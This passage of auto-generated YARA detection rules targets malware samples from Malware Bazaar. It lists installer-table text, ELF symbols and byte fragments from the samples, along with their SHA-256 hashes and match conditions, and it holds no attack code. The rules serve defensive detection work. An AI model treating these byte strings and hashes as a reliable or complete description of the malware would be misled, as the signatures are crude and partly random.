      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s3 = "ReachFramework.resources.dll" fullword wide
      $s4 = "get_loader_name_from_dll" fullword ascii
      $s5 = "Update.dll" fullword ascii
      $s6 = "4C4}INSTALLFOLDERl4dPleasePleasePleaseProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProc" ascii
      $s7 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s8 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "get_loader_name" fullword ascii
      $s11 = "qgethostname" fullword ascii
      $s12 = "process_config_directive" fullword ascii
      $s13 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s14 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s15 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s16 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s17 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s18 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s19 = "vloader_failure" fullword ascii
      $s20 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 30000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _107922ca8ec9b7cc2c71e15b4c554275bc5770931c3c7c90bccbdc837458324d_4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f7021178_1 {
   meta:
      description = "evidences - from files 107922ca8ec9b7cc2c71e15b4c554275bc5770931c3c7c90bccbdc837458324d.elf, 4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "107922ca8ec9b7cc2c71e15b4c554275bc5770931c3c7c90bccbdc837458324d"
      hash2 = "4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb"
   strings:
      $s1 = "AuthorizH" fullword ascii
      $s2 = "J_R=I)" fullword ascii
      $s3 = "2\\fWQx" fullword ascii
      $s4 = "fdxfv%" fullword ascii
      $s5 = "bh.b|C" fullword ascii
      $s6 = "5'0v2ZP" fullword ascii
      $s7 = "'A,6y-" fullword ascii
      $s8 = "NXfT>o" fullword ascii
      $s9 = "M}8vhJ" fullword ascii
      $s10 = "aS&v&*" fullword ascii
      $s11 = "#P0_?G0" fullword ascii
      $s12 = "X @l(&" fullword ascii
      $s13 = "y#y&Jb" fullword ascii
      $s14 = "|c~=;F" fullword ascii
      $s15 = "eyj5yR" fullword ascii
      $s16 = "/\\U ?J" fullword ascii
      $s17 = "}BzJ88" fullword ascii
      $s18 = "}9]Jn+LhyK" fullword ascii
      $s19 = "/`P*d#" fullword ascii
      $s20 = "2cb:RO" fullword ascii
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9731e300a22b902c4b728945d125681bcbb357fbaeb9097cc3073f6085a1f447_b4610a17b2b8935d83eed7e8eba49659de82f45fdd7dd4c79fbfee8cf1_2 {
   meta:
      description = "evidences - from files 9731e300a22b902c4b728945d125681bcbb357fbaeb9097cc3073f6085a1f447.elf, b4610a17b2b8935d83eed7e8eba49659de82f45fdd7dd4c79fbfee8cf1b4bce0.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "9731e300a22b902c4b728945d125681bcbb357fbaeb9097cc3073f6085a1f447"
      hash2 = "b4610a17b2b8935d83eed7e8eba49659de82f45fdd7dd4c79fbfee8cf1b4bce0"
   strings:
      $s1 = "__FRAME_END__" fullword ascii
      $s2 = "socket" fullword ascii /* Goodware String - occured 452 times */
      $s3 = "__data_start" fullword ascii
      $s4 = "deregister_tm_clones" fullword ascii
      $s5 = "_edata" fullword ascii /* Goodware String - occured 2 times */
      $s6 = "crtstuff.c" fullword ascii /* Goodware String - occured 2 times */
      $s7 = "__dso_handle" fullword ascii
      $s8 = "__bss_start" fullword ascii
      $s9 = "__TMC_END__" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb_8e09de570ef224ab7e8c5a293256edf89b9ecd7a2f728563fe31ad7a44_3 {
   meta:
      description = "evidences - from files 4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb.exe, 8e09de570ef224ab7e8c5a293256edf89b9ecd7a2f728563fe31ad7a44241921.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb"
      hash2 = "8e09de570ef224ab7e8c5a293256edf89b9ecd7a2f728563fe31ad7a44241921"
   strings:
      $s1 = "DOWNGRD" fullword ascii
      $s2 = "=UUUUw" fullword ascii /* Goodware String - occured 1 times */
      $s3 = "o\\$ fE" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "QZ^&A!" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "33333333H!" fullword ascii
      $s6 = "H1D$0H" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( all of them )
      ) or ( all of them )
}
